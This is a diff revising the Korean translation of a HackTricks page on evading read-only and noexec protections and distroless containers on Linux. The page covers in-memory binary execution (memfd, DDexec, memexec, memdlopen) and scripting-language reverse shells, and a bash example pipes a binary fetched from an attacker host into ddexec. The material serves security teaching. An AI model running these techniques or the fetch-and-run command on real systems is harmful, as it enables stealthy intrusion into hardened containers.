@@ -15,9 +15,9 @@ GCP 해킹 배우기 및 연습하기: <img src="../../../.gitbook/assets/grte.p
 </details>
 {% endhint %}
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-**해킹 경력**에 관심이 있고 해킹할 수 없는 것을 해킹하고 싶다면 - **우리는 채용 중입니다!** (_유창한 폴란드어 필기 및 구사 필수_).
+**해킹 경력**에 관심이 있고 해킹할 수 없는 것을 해킹하고 싶다면 - **우리는 인재를 모집합니다!** (_유창한 폴란드어 필기 및 구사 필수_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
@@ -25,12 +25,12 @@ GCP 해킹 배우기 및 연습하기: <img src="../../../.gitbook/assets/grte.p
 
 다음 비디오에서 이 페이지에 언급된 기술을 더 깊이 설명합니다:
 
-* [**DEF CON 31 - 리눅스 메모리 조작 탐색을 통한 은폐 및 회피**](https://www.youtube.com/watch?v=poHirez8jk4)
-* [**DDexec-ng 및 메모리 내 dlopen()을 통한 은폐 침입 - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)
+* [**DEF CON 31 - 스텔스 및 회피를 위한 리눅스 메모리 조작 탐색**](https://www.youtube.com/watch?v=poHirez8jk4)
+* [**DDexec-ng 및 인메모리 dlopen()을 이용한 스텔스 침투 - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)
 
 ## 읽기 전용 / 실행 금지 시나리오
 
-리눅스 머신이 **읽기 전용 (ro) 파일 시스템 보호**로 마운트되는 경우가 점점 더 많아지고 있습니다. 특히 컨테이너에서 그렇습니다. 이는 **`readOnlyRootFilesystem: true`**를 `securitycontext`에 설정하는 것만으로도 컨테이너를 ro 파일 시스템으로 실행할 수 있기 때문입니다:
+리눅스 머신이 **읽기 전용 (ro) 파일 시스템 보호**로 마운트되는 경우가 점점 더 많아지고 있습니다. 특히 컨테이너에서 그렇습니다. 이는 **`readOnlyRootFilesystem: true`**를 `securitycontext`에 설정하는 것만으로도 컨테이너를 실행할 수 있기 때문입니다:
 
 <pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
 kind: Pod
@@ -53,7 +53,7 @@ securityContext:
 
 ## 가장 쉬운 우회: 스크립트
 
-바이너리를 언급했지만, 기계 내에 인터프리터가 있는 한 **어떤 스크립트든 실행할 수 있습니다**. 예를 들어, `sh`가 있는 경우 **셸 스크립트**를 실행하거나 `python`이 설치된 경우 **파이썬 스크립트**를 실행할 수 있습니다.
+바이너리를 언급했지만, 기계 내에 인터프리터가 있는 한 **어떤 스크립트도 실행할 수 있습니다**. 예를 들어, `sh`가 있는 경우 **셸 스크립트**를 실행하거나 `python`이 설치된 경우 **파이썬 스크립트**를 실행할 수 있습니다.
 
 그러나 이것만으로는 바이너리 백도어나 실행해야 할 다른 바이너리 도구를 실행하기에 충분하지 않습니다.
 
@@ -63,14 +63,14 @@ securityContext:
 
 ### FD + exec 시스템 호출 우회
 
-기계 내에 **Python**, **Perl**, 또는 **Ruby**와 같은 강력한 스크립트 엔진이 있는 경우, 메모리에서 실행할 바이너리를 다운로드하고, 메모리 파일 설명자(`create_memfd` 시스템 호출)에 저장할 수 있습니다. 이는 이러한 보호에 의해 보호되지 않으며, 그런 다음 **`exec` 시스템 호출**을 호출하여 **실행할 파일로 fd를 지정**합니다.
+기계 내에 **Python**, **Perl**, 또는 **Ruby**와 같은 강력한 스크립트 엔진이 있는 경우, 메모리에서 실행할 바이너리를 다운로드하고, 메모리 파일 설명자(`create_memfd` 시스템 호출)에 저장할 수 있습니다. 이는 이러한 보호에 의해 보호되지 않으며, 그런 다음 **`exec` 시스템 호출**을 호출하여 **실행할 파일로 fd를 지정**할 수 있습니다.
 
 이를 위해 [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) 프로젝트를 쉽게 사용할 수 있습니다. 바이너리를 전달하면 **바이너리가 압축되고 b64 인코딩된** 스크립트를 지정된 언어로 생성하며, **fd**를 생성하여 `create_memfd` 시스템 호출을 호출하고 이를 실행하기 위한 **exec** 시스템 호출을 포함합니다.
 
 {% hint style="warning" %}
-이 방법은 PHP나 Node와 같은 다른 스크립팅 언어에서는 작동하지 않습니다. 왜냐하면 스크립트에서 원시 시스템 호출을 호출하는 **기본 방법이 없기 때문입니다**. 따라서 바이너리를 저장할 **메모리 fd**를 생성하기 위해 `create_memfd`를 호출할 수 없습니다.
+이 방법은 PHP나 Node와 같은 다른 스크립팅 언어에서는 작동하지 않습니다. 왜냐하면 스크립트에서 원시 시스템 호출을 호출하는 **기본 방법이 없기 때문**입니다. 따라서 바이너리를 저장할 **메모리 fd**를 생성하기 위해 `create_memfd`를 호출할 수 없습니다.
 
-또한, `/dev/shm`에 있는 파일로 **정상 fd**를 생성하는 것은 작동하지 않습니다. 왜냐하면 **실행 금지 보호**가 적용되기 때문에 실행할 수 없기 때문입니다.
+또한, `/dev/shm`에 있는 파일로 **정규 fd**를 생성하는 것은 작동하지 않습니다. 왜냐하면 **실행 금지 보호**가 적용되기 때문에 실행할 수 없기 때문입니다.
 {% endhint %}
 
 ### DDexec / EverythingExec
@@ -80,7 +80,7 @@ securityContext:
 따라서 **프로세스에서 실행되는 어셈블리 코드를 제어**함으로써, **셸코드**를 작성하고 프로세스를 "변형"하여 **임의의 코드를 실행**할 수 있습니다.
 
 {% hint style="success" %}
-**DDexec / EverythingExec**를 사용하면 **메모리**에서 자신의 **셸코드** 또는 **어떤 바이너리든** 로드하고 **실행**할 수 있습니다.
+**DDexec / EverythingExec**를 사용하면 **메모리**에서 자신의 **셸코드** 또는 **어떤 바이너리**를 **로드하고 실행**할 수 있습니다.
 {% endhint %}
 ```bash
 # Basic example
@@ -96,7 +96,7 @@ wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo
 
 [**Memexec**](https://github.com/arget13/memexec)는 DDexec의 자연스러운 다음 단계입니다. **다른 바이너리**를 **실행**하고 싶을 때마다 DDexec를 다시 시작할 필요 없이, DDexec 기술을 통해 memexec 셸코드를 실행하고 **이 데몬과 통신하여 새 바이너리를 로드하고 실행**할 수 있습니다.
 
-**memexec를 사용하여 PHP 리버스 셸에서 바이너리를 실행하는 방법에 대한 예시는** [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php)에서 확인할 수 있습니다.
+**memexec를 사용하여 PHP 리버스 셸에서 바이너리를 실행하는 방법에 대한 예제**는 [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php)에서 확인할 수 있습니다.
 
 ### Memdlopen
 
@@ -112,13 +112,13 @@ Distroless 컨테이너의 목표는 **불필요한 구성 요소를 제거하�
 
 ### 리버스 셸
 
-Distroless 컨테이너에서는 **정상적인 셸을 얻기 위해 `sh` 또는 `bash`를 찾을 수 없을 수도 있습니다**. `ls`, `whoami`, `id`와 같은 바이너리도 찾을 수 없습니다... 시스템에서 일반적으로 실행하는 모든 것입니다.
+Distroless 컨테이너에서는 **정상적인 셸을 얻기 위해 `sh` 또는 `bash`**를 찾을 수 없을 수도 있습니다. `ls`, `whoami`, `id`와 같은 바이너리도 찾을 수 없습니다... 시스템에서 일반적으로 실행하는 모든 것입니다.
 
 {% hint style="warning" %}
 따라서, **리버스 셸**을 얻거나 **시스템을 열거**할 수 없습니다.
 {% endhint %}
 
-그러나 손상된 컨테이너가 예를 들어 플라스크 웹을 실행하고 있다면, 파이썬이 설치되어 있으므로 **파이썬 리버스 셸**을 얻을 수 있습니다. 노드를 실행하고 있다면 Node 리버스 셸을 얻을 수 있으며, 대부분의 **스크립팅 언어**와 동일합니다.
+그러나 손상된 컨테이너가 예를 들어 플라스크 웹을 실행하고 있다면, 파이썬이 설치되어 있으므로 **파이썬 리버스 셸**을 얻을 수 있습니다. 노드를 실행하고 있다면 Node 리버스 셸을 얻을 수 있으며, 대부분의 **스크립팅 언어**와 마찬가지입니다.
 
 {% hint style="success" %}
 스크립팅 언어를 사용하여 언어의 기능을 활용하여 **시스템을 열거**할 수 있습니다.
@@ -130,25 +130,25 @@ Distroless 컨테이너에서는 **정상적인 셸을 얻기 위해 `sh` 또는
 그러나 이러한 종류의 컨테이너에서는 이러한 보호가 일반적으로 존재하지만, **이전 메모리 실행 기술을 사용하여 우회할 수 있습니다**.
 {% endhint %}
 
-**RCE 취약점을 악용하여 스크립팅 언어의 리버스 셸을 얻고 메모리에서 바이너리를 실행하는 방법에 대한 예시는** [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE)에서 확인할 수 있습니다.
+**RCE 취약점을 악용하여 스크립팅 언어의 리버스 셸을 얻고 메모리에서 바이너리를 실행하는 방법에 대한 예제**는 [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE)에서 확인할 수 있습니다.
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **해킹 경력**에 관심이 있고 해킹할 수 없는 것을 해킹하고 싶다면 - **우리는 인재를 모집합니다!** (_유창한 폴란드어 필기 및 구사 필수_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
 {% hint style="success" %}
-AWS 해킹 배우고 연습하기:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
-GCP 해킹 배우고 연습하기: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWS 해킹 배우기 및 연습하기:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP 해킹 배우기 및 연습하기: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>HackTricks 지원하기</summary>
 
-* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
+* [**구독 계획**](https://github.com/sponsors/carlospolop)을 확인하세요!
 * 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
-* [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.
+* [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.
 
 </details>
 {% endhint %}
